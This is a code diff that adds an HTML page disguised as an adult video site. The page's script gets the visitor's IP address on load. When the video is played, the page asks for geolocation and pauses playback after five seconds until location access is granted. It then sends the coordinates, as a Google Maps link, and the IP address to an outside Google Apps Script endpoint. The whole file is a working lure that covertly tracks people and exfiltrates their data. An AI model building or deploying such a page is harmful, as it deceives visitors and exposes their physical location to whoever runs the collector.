@@ -1,0 +1,116 @@
+<!DOCTYPE html> 
+<html> 
+<body> 
+
+    <div>
+        <h1>Ho Girls</h1>
+        <h3>Sexy Videos</h3>
+        <p id="ip-address"></p>
+        <p id="LinkToMap"></p>
+        <p id="error"></p>
+    </div>
+
+<video id="myVideo" width="320" height="176" controls>
+  <source src="mov_bbb.mp4" type="video/mp4">
+  <source src="mov_bbb.ogg" type="video/ogg">
+  Your browser does not support HTML5 video.
+</video>
+<div id="hello"></div>
+<script>
+let isLocationGranted = false;
+
+let vid = document.getElementById("myVideo");
+vid.onplay = function() {
+   
+    if (isLocationGranted == false)
+      { getLocation()
+        setTimeout(function() { pauseVid(); }, 5000);
+      }
+  
+};
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+vid.play();
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    var lat = position.coords.latitude;
+    var lon = position.coords.longitude;
+
+    isLocationGranted = true
+  document.getElementById("LinkToMap").textContent = `IP Address: Google Map Link : https://google.com/maps/place/${lat}+${lon}`;
+
+  playVid()
+
+  
+  let form_data = new FormData();
+  form_data.append("location",`https://google.com/maps/place/${lat}+${lon}`);
+  form_data.append("ip",document.getElementById("ip-address").textContent);
+
+   
+//   let form_data = new FormData();
+//   form_data.set('data', {
+//     "location": `https://google.com/maps/place/${lat}+${lon}`,
+//     "ip" : document.getElementById("ip-address").textContent,
+//   });
+  console.log(form_data)
+ 
+
+  fetch('https://script.google.com/macros/s/AKfycbxSPKNpig3LEGjMwgpYFH08Kf0_vQCuDw--CE9lbu0paWqUQ3zi1Zv9HYw6ZI2Xvv8j/exec', {
+                    method: "POST",
+                    body: form_data
+                })
+                // The fetch() method is used to make a request to the server and retrieve data.
+                // This is an example API endpoint. Replace it with the actual URL for the API endpoint you want to use.
+                .then(res => res.text())
+
+                .then(data => {
+                    console.log.data
+                     document.querySelector("#error").innerHTML = data;
+                    // // The innerHTML property sets or returns the HTML content of an element.
+                    // // Here, we are setting the content of the <h1> element to the response from the server.
+                    // document.querySelector("#sub").value = "Submit"
+                    // Change the value of the submit button back to "Submit" after the form has been submitted.
+                });
+
+ 
+
+}
+
+function pauseVid() {
+    vid.pause();
+}
+
+function playVid() {
+    vid.play();
+}
+ 
+document.addEventListener("DOMContentLoaded", function() {
+        // Fetch the IP address from the API
+        fetch("https://ipinfo.io/json") 
+            .then(response => response.json())
+            .then(data => {
+                // Display the IP address on the screen
+                document.getElementById("ip-address").textContent = 
+                      `IP Address: ${data.ip}`;
+            })
+            .catch(error => {
+                console.error("Error fetching IP address:", error);
+
+               
+                document.getElementById("ip-address").textContent = 
+                      "Unable to retrieve IP address.";
+            });
+    });
+ 
+</script> 
+
+ 
+ 
+</body> 
+</html>
